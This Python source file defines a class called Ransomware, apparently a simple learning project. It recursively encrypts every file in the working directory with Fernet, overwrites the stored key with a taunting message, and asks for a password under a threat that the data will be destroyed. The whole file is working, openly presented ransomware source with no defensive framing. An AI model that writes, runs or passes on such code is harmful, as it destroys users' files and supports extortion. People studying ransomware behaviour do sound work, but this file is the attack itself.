import os
from cryptography.fernet import Fernet


class Ransomware():
    def __init__(self):
        self.file_list = []
        self.senha = "sidao"
        self.key = ""
        self.ignore = ["ransom.py",
                       "dontlook.txt",
                       "decrypt.py",
                       "ransomware.py",
                       "senhaExtra.txt",
                       "./__pycache__"]

    def get_file_list(self):
        self.file_list = []
        for file in os.listdir():
            if file in self.ignore or file[0] == ".":
                continue
            if os.path.isfile(file):
                self.file_list.append(file)

    def get_files_recursive(self, path='.'):
        self.file_list = []
        for root, dirs, files in os.walk(path):
            for file in files:
                if file not in self.ignore and root not in self.ignore:
                    self.file_list.append(os.path.join(root, file))

    def read_key(self):
        print("Reading key file")
        with open("./__pycache__/dontlook.txt", "rb") as keyfile:
            self.key = keyfile.read()

    def encrypt(self):
        print("Encrypting files")
        self.get_files_recursive()
        self.read_key()
        for file in self.file_list:
            with open(file, "rb") as target_file:
                file_content = target_file.read()
                target_encrypted = Fernet(self.key).encrypt(file_content)
            with open(file, "wb") as target_file:
                target_file.write(target_encrypted)
            print("Encrypted ", file)
        with open("./__pycache__/dontlook.txt", "w") as f:
            f.write("What a bummer, the key was here")

    def ask_password(self) -> str:
        senha_input = input(
            "Não tente chutar a senha, seus dados serão destruídos. \n >>> "
        )
        return senha_input

    def decrypt(self):
        print("Decrypting files")
        self.get_files_recursive()
        self.key = self.ask_password()
        with open("./__pycache__/dontlook.txt", "w") as f:
            f.write(self.key)
        f = Fernet(self.key)
        for file in self.file_list:
            with open(file, "rb") as target_file:
                decrypted_content = f.decrypt(target_file.read())
            with open(file, "wb") as target_file:
                target_file.write(decrypted_content)
            print("Decrypted ", file)
